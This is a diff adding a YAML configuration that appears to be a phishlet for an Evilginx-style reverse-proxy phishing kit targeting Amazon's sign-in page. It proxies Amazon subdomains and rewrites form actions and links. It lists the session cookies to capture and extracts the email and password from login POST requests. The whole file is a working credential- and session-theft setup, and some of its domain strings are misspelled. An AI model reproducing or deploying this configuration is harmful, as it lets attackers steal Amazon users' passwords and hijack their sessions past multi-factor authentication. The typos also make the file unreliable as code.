@@ -1,0 +1,33 @@
+author: '@customsync'
+min_ver: '3.0.0'
+redirect_url: 'https://www.amazon.com/'
+proxy_hosts:
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'amazon.com', session: true, is_landing: true, auto_filter: true}
+  - {phish_sub: 'fls-na', orig_sub: 'fls-na', domain: 'amazon.com', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'images-na', orig_sub: 'images-na', domain: 'ssl-images-amazon.com', session: false, is_landing: false, auto_filter: true}
+sub_filters:
+  - {triggers_on: 'www.amazon.com', orig_sub: 'www', domain: 'amazon.com', search: 'action="https://{hostname}', replace: 'action="https://{hostname}', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'www.amazon.com', orig_sub: 'www', domain: 'amazon.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'fls-na.amazon.com', orig_sub: 'fls-na', domain: 'amazon.com', search: 'action="https://{hostname}', replace: 'action="https://{hostname}', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'fls-na.amazon.com', orig_sub: 'fls-na', domain: 'amazon.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'images-na.ssl-iamges-amazon.com', orig_sub: 'images-na', domain: 'ssl-iges-amazon.com', search: 'action="https://{hostname}', replace: 'action="https://{hostname}', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'images-na.ssl-iamges-amazon.com', orig_sub: 'images-na', domain: 'ssl-images-amazon.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json']}
+auth_tokens:
+  - domain: '.amazon.com'
+    keys: ['at-main:always','lc-main:always','sess-at-main:always','session-id:always','session-id-time:always','session-token:always','sst-main:always','ubid-main:always','x-main:always','skin:always','a-ogbcbff:always']
+    type: 'cookie'
+auth_urls:
+  - '/ap/signin'
+  - '/gp/yourstore/home'
+credentials:
+  username:
+    key: 'email'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+login:
+  domain: 'www.amazon.com'
+  path: '/ap/signin?_encoding=UTF8&ignoreAuthState=1&openid.assoc_handle=usflex&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.mode=checkid_setup&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0'
